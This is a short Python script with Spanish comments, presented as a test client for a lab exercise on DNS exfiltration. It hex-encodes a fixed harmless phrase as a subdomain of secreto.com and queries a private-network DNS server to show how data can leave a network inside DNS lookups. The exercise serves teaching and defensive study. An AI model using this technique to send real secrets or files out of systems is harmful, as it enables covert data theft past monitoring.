#!/usr/bin/python3
# Archivo ....: dns_client_1.py
# Descripcion : Cliente DNS de prueba para la practica DNSpy (exfiltracion por DNS)

import dns.message
import dns.query

servidor = "192.168.135.29"
puerto = 53
dominio = "secreto.com"
subdominio = "6461746f73206f63756c746f73"

dominiocompleto = subdominio + "." + dominio

print("Inicio del envio")

request = dns.message.make_query(dominiocompleto, dns.rdatatype.A)
response = dns.query.udp(request, servidor, timeout=5)

print("Respuesta: ", response)
print("Fin del envio")
